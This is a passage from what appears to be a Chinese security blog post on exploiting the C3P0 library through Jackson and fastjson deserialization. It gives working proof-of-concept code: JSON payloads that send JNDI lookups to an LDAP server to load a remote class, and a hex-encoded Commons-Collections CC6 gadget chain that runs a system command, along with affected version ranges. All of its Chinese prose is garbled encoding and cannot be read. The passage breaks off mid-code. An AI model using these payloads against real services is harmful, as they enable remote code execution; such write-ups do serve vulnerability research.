alt="image-20241016103455230"></p><p>æŸ¥æ‰¾ç”¨æ³•ï¼Œinner()è°ƒç”¨äº†dereference</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241016103652918.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241016103652918.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241016103652918"></p><p>JndiRefForwardingDataSourceæœ‰å…­ä¸ªæ–¹æ³•éƒ½è°ƒç”¨äº†inner</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241016104312261.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241016104312261.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241016104312261"></p><p>æ³¨æ„åˆ°JndiRefForwardingDataSourceæ˜¯ä¸ªfinal+æ²¡æœ‰æŒ‡å®šä¿®é¥°ç¬¦ç±»ï¼ˆPackage-Privateï¼‰ï¼Œä»…åœ¨åŒè½¯ä»¶åŒ…ä¸‹çš„ç±»å¯è®¿é—®</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241016104930428.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241016104930428.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241016104930428"></p><p>æŸ¥æ‰¾ç”¨æ³•ä»…æ‰¾åˆ°ä¸€å¤„å®ä¾‹åŒ–ï¼Œä½äºJndiRefConnectionPoolDataSource</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241016111132442.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241016111132442.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241016111132442"></p><p>è·Ÿè¿›åˆ°è¯¥ç±»çš„æ–¹æ³•ï¼Œå‘ç°æ˜¯æ„é€ å‡½æ•°ï¼Œå¹¶ä¸”å®ä¾‹åŒ–ä¹‹åç”¨WrapperConnectionPoolDataSource.setNestedDataSourceè£…é…</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241016111356658.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241016111356658.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241016111356658"></p><p>æ—¢ç„¶æ„é€ å‡½æ•°å®ä¾‹åŒ–äº†JndiRefForwardingDataSourceï¼Œåé¢ä¸€å®šä¼šæœ‰æ–¹æ³•è°ƒç”¨åˆ°JndiRefForwardingDataSourceä¸­çš„æ–¹æ³•</p><p>æœç„¶ï¼Œå¯¹åº”äº†ä¸Šé¢å…­ä¸ªæ–¹æ³•éƒ½æœ‰è°ƒç”¨</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241016140909671.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241016140909671.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241016140909671"></p><p>ç°åœ¨çš„é—®é¢˜æ˜¯ï¼Œæ€ä¹ˆå‘<code>dereference</code> jndiNameä¼ å‚</p><p>å…±æœ‰ä¸¤ä¸ªåœ°æ–¹å¯¹jdniNameè¿›è¡Œäº†èµ‹å€¼</p><ol><li>setJndiName</li></ol><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241016131839308.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241016131839308.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241016131839308"></p><ol start="2"><li>readObject</li></ol><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241016132153912.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241016132153912.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æˆ‘ä»¬ç”¨jacksonå’Œfastjsonæ‰“æ‰èƒ½è§¦å‘å…­ä¸ªæ–¹æ³•ä¸­çš„setterï¼Œè€Œjackson&#x2F;fastjsonä¸ä¼šè§¦å‘readObject</p><p>ä¸Šé¢å…­ä¸ªéšä¾¿æŒ‘ä¸€ä¸ªæ–¹æ³•ï¼Œå°±æŒ‘ä¸€ä¸ªå‚æ•°æœ€ç®€å•çš„setLoginTimeout</p><p>soï¼Œæˆ‘ä»¬çš„åˆ©ç”¨é“¾ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ä¼ å‚jndiNameï¼š</span><br><span class="line">    jackson/fastjson -&gt;</span><br><span class="line">JndiRefConnectionPoolDataSource.setJndiName</span><br><span class="line">    JndiRefDataSourceBase.setJndiName</span><br><span class="line">è§¦å‘JNDIï¼š</span><br><span class="line">    jackson/fastjson -&gt;</span><br><span class="line">    JndiRefConnectionPoolDataSource.setLoginTimeout</span><br><span class="line">    JndiRefForwardingDataSource.setLoginTimeout -&gt; inner -&gt; dereference -&gt; JNDI</span><br></pre></td></tr></table></figure><h3 id="jacksonæ‰“C3P0-JNDI"><a href="#jacksonæ‰“C3P0-JNDI" class="headerlink" title="jacksonæ‰“C3P0 JNDI"></a>jacksonæ‰“C3P0 JNDI</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Jackson 2.7ç³»åˆ— &lt; 2.7.9.2</span><br><span class="line">Jackson 2.8ç³»åˆ— &lt; 2.8.11</span><br><span class="line">Jackson 2.9ç³»åˆ— &lt; 2.9.4</span><br></pre></td></tr></table></figure><p>é€‚ç”¨äºTemplatesImplè¢«ban</p><p>POCï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">jackson_JNDI</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">enableDefaultTyping_Test</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> Object object;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">jndiName</span> <span class="operator">=</span> <span class="string">&quot;&#x27;ldap://127.0.0.1:1099/JDNI_RuntimeEvil&#x27;&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonInput</span> <span class="operator">=</span> aposToQuotes(<span class="string">&quot;&#123;\&quot;object\&quot;:[&#x27;com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource&#x27;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#x27;jndiName&#x27;:&quot;</span>+jndiName+<span class="string">&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#x27;loginTimeout&#x27;:&#x27;2&#x27;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;]\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">        System.out.printf(jsonInput);</span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();</span><br><span class="line">        mapper.enableDefaultTyping();</span><br><span class="line">        jackson_JNDI.enableDefaultTyping_Test test;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            test = mapper.readValue(jsonInput, jackson_JNDI.enableDefaultTyping_Test.class);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">aposToQuotes</span><span class="params">(String json)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> json.replace(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;\&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241014121955829.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241014121955829.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241016172934901"></p><p>jacksoné«˜ç‰ˆæœ¬å¯¹æœ¬æ–‡åˆ©ç”¨ç±»åŠ äº†é»‘åå•</p><h3 id="fastjsonæ‰“C3P0-JNDI"><a href="#fastjsonæ‰“C3P0-JNDI" class="headerlink" title="fastjsonæ‰“C3P0 JNDI"></a>fastjsonæ‰“C3P0 JNDI</h3><p>fastjson &lt;&#x3D; 1.2.47 åˆ©ç”¨ç¼“å­˜ç»•è¿‡ï¼Œæ‰“C3P0é€‚ç”¨äºç¯å¢ƒJdbcRowSetImplè¢«ban</p><p>POCï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">fastjson_JNDI</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;&#123;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\&quot;val\&quot;:\&quot;com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource\&quot;&#125;,&#123;\&quot;@type\&quot;:\&quot;com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource\&quot;,\&quot;jndiName\&quot;:\&quot;ldap://127.0.0.1:1099/JDNI_RuntimeEvil\&quot;,\&quot;loginTimeout\&quot;:2&#125;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>autoTypeä¼šæŠŠæœ¬æ–‡æ¶‰åŠçš„åˆ©ç”¨ç±»åŠ å…¥é»‘åå•ï¼Œæ‰€ä»¥fastjsonè¯¥ç»•è¿‡çš„è¦ç»•è¿‡</p><p>æ‰“readObjectä¹Ÿä¸æ˜¯ä¸å¯ä»¥ï¼Œæœ‰ä¾èµ–åŒ…çš„è¯éšä¾¿æŒ‘ä¸€ä¸ªæ‰“getter&#x2F;setterçš„æ–¹æ³•</p><p>æ¯”å¦‚ç”¨jackson 2.13.3çš„POJONode.toString-&gt;getter</p><p>æ¯”å¦‚Romeçš„ToStringBean.toString-&gt;getter</p><p>ä¸é‡å¤å¥—å¨ƒäº†å°±</p><h1 id="C3P0ä¸å‡ºç½‘"><a href="#C3P0ä¸å‡ºç½‘" class="headerlink" title="C3P0ä¸å‡ºç½‘"></a>C3P0ä¸å‡ºç½‘</h1><h2 id="SerializableUtilsååºåˆ—åŒ–å­—èŠ‚ç "><a href="#SerializableUtilsååºåˆ—åŒ–å­—èŠ‚ç " class="headerlink" title="SerializableUtilsååºåˆ—åŒ–å­—èŠ‚ç "></a>SerializableUtilsååºåˆ—åŒ–å­—èŠ‚ç </h2><p>éœ€è¦æœ‰fastjson&#x2F;jacksonä¾èµ–</p><p>æ¼æ´å…¥å£ä½äºC3P0ImplUtils.parseUserridesAsString</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241016172934901.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241016172934901.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241016172934901"></p><p>paseUserridesAsStringå¯¹ä¼ å…¥çš„å‚æ•°userOverridesAsStringå­—ç¬¦ä¸²å¤„ç†å¦‚ä¸‹ï¼š</p><ol><li>ä»<code>HASM_HEADER</code>é•¿åº¦+1å¼€å§‹ï¼Œæˆªå–åˆ°userOverridesAsStringçš„å€’æ•°ç¬¬äºŒä¸ªå­—ç¬¦</li></ol><p>HASM_HEADERä¸º<code>HexAsciiSerializedMap</code></p><ol start="2"><li>è°ƒç”¨<code>ByteUtils.fromHexAscii</code>æŠŠæˆªå–çš„å­—ç¬¦ä¸²è½¬ä¸ºäºŒè¿›åˆ¶</li><li>è°ƒç”¨<code>SerializableUtils.fromByteArray</code>ååºåˆ—åŒ–å­—èŠ‚ç </li></ol><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241016174046772.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241016174046772.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241016174046772"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241016174053242.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241016174053242.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241016174053242"></p><p>å‘parseUserOverridesAsStringä¼ å‚<code>HexAsciiSerializedMap+ä»»æ„å­—ç¬¦+æ¶æ„åå…­è¿›åˆ¶å­—èŠ‚ç +ä»»æ„å­—ç¬¦</code>å°±èƒ½äºŒæ¬¡ååºåˆ—åŒ–</p><p>WrapperConnectionPoolDataSourceæ„é€ å‡½æ•°è°ƒç”¨äº†parseUserOverridesAsStringï¼Œä½†æ˜¯è¿™ç”¨ä¸äº†ï¼Œä½ æ€»ä¸èƒ½è¿˜æ²¡å£°æ˜ç±»å°±è°ƒç”¨setterç»™userOverridesAsStringèµ‹å€¼äº†å§</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241016175106091.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241016175106091.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241016175106091"></p><p>ä»”ç»†çœ‹ä¸€ä¸‹è¿™ä¸ªæ„é€ å‡½æ•°ï¼š</p><p>åœ¨è°ƒç”¨parseOver..ä¹‹å‰ï¼Œå…ˆè°ƒç”¨äº†setUpPropertyListeners</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241016180950919.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241016180950919.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241016180950919"></p><p>setUpPropertyListenerså¦‚ä¸‹ï¼Œåˆ›å»ºäº†ä¸€ä¸ªVetoableChangeListenerç›‘å¬å™¨ï¼ˆè¯¥ç›‘å¬å™¨ä½œç”¨äºå…¨å±€ï¼Œç±»å±æ€§å˜åŒ–çš„æ—¶å€™å°±ä¼šè§¦å‘ï¼‰ï¼Œå¦‚æœuserOverridesAsStringå‘ç”Ÿå˜åŒ–ï¼Œå°±ä¼šè°ƒç”¨<code>C3P0ImplUtils.parseUserOverridesAsString</code>ï¼Œå°±æ˜¯ä½ è¾£ï¼</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">setUpPropertyListeners</span><span class="params">()</span></span><br><span class="line">   &#123;</span><br><span class="line"><span class="type">VetoableChangeListener</span> <span class="variable">setConnectionTesterListener</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">VetoableChangeListener</span>()</span><br><span class="line">    &#123;</span><br><span class="line"><span class="comment">// always called within synchronized mutators of the parent class... needn&#x27;t explicitly sync here</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">vetoableChange</span><span class="params">( PropertyChangeEvent evt )</span> <span class="keyword">throws</span> PropertyVetoException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">propName</span> <span class="operator">=</span> evt.getPropertyName();</span><br><span class="line">    <span class="type">Object</span> <span class="variable">val</span> <span class="operator">=</span> evt.getNewValue();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( <span class="string">&quot;connectionTesterClassName&quot;</span>.equals( propName ) )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">&#123; recreateConnectionTester( (String) val ); &#125;</span><br><span class="line">    <span class="keyword">catch</span> ( Exception e )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//e.printStackTrace();</span></span><br><span class="line">    <span class="keyword">if</span> ( logger.isLoggable( MLevel.WARNING ) )</span><br><span class="line">logger.log( MLevel.WARNING, <span class="string">&quot;Failed to create ConnectionTester of class &quot;</span> + val, e );</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">PropertyVetoException</span>(<span class="string">&quot;Could not instantiate connection tester class with name &#x27;&quot;</span> + val + <span class="string">&quot;&#x27;.&quot;</span>, evt);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;userOverridesAsString&quot;</span>.equals( propName ))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">&#123; WrapperConnectionPoolDataSource.<span class="built_in">this</span>.userOverrides = C3P0ImplUtils.parseUserOverridesAsString( (String) val ); &#125;</span><br><span class="line">    <span class="keyword">catch</span> (Exception e)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ( logger.isLoggable( MLevel.WARNING ) )</span><br><span class="line">logger.log( MLevel.WARNING, <span class="string">&quot;Failed to parse stringified userOverrides. &quot;</span> + val, e );</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">PropertyVetoException</span>(<span class="string">&quot;Failed to parse stringified userOverrides. &quot;</span> + val, evt);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;;</span><br><span class="line"><span class="built_in">this</span>.addVetoableChangeListener( setConnectionTesterListener );</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>WrapperContentionPoolDataSourceæ˜¯publicç±»ï¼Œæœ‰æ— å‚æ„é€ å‡½æ•°ï¼Œjackson&#x2F;fastjsonä¼šè‡ªåŠ¨è°ƒæ— å‚æ„é€ å‡½æ•°å®ä¾‹åŒ–çš„ã€‚</p><p>åˆ©ç”¨é“¾ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  jackson/fastjson -&gt;</span><br><span class="line">  WrapperContentionPoolDataSource.constructor</span><br><span class="line">WrapperContentionPoolDataSource.setUserOverridesAsSstring -&gt;</span><br><span class="line">C3P0ImplUtils.parseUserOverridesAsString -&gt;</span><br><span class="line">  SerializableUtils.fromByteArray -&gt; readObejct</span><br></pre></td></tr></table></figure><h3 id="jackson-C3P0æ‰“CC6"><a href="#jackson-C3P0æ‰“CC6" class="headerlink" title="jackson+C3P0æ‰“CC6"></a>jackson+C3P0æ‰“CC6</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">//jackson æ‰“C3P0 CC6å­—èŠ‚ç ï¼Œby C3P0ImplUtils.parseUserOverridesAsString</span></span><br><span class="line"><span class="comment">//    jackson/fastjson -&gt;</span></span><br><span class="line"><span class="comment">//    WrapperContentionPoolDataSource.constructor</span></span><br><span class="line"><span class="comment">//    WrapperContentionPoolDataSource.setUserOverridesAsSstring -&gt;</span></span><br><span class="line"><span class="comment">//  C3P0ImplUtils.parseUserOverridesAsString -&gt;</span></span><br><span class="line"><span class="comment">//    SerializableUtils.fromByteArray -&gt; readObejct</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">jackson_C3P0ImplUtils_HEX_CC6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">enableDefaultTyping_Test</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> Object object;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">GenerateCC6</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(map, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="string">&quot;godown&quot;</span>));</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;test1&quot;</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(tiedMapEntry, <span class="string">&quot;test2&quot;</span>);</span><br><span class="line">        map.remove(<span class="string">&quot;test1&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">lazymapClass</span> <span class="operator">=</span> lazyMap.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factory</span> <span class="operator">=</span> lazymapClass.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">modifiersField</span> <span class="operator">=</span> Field.class.getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line">        modifiersField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        modifiersField.setInt(factory, factory.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">        factory.set(lazyMap, chainedTransformer);</span><br><span class="line">        serialize(hashMap);</span><br><span class="line">        <span class="keyword">return</span> binaryFileToHexString(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;cc6.ser&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> 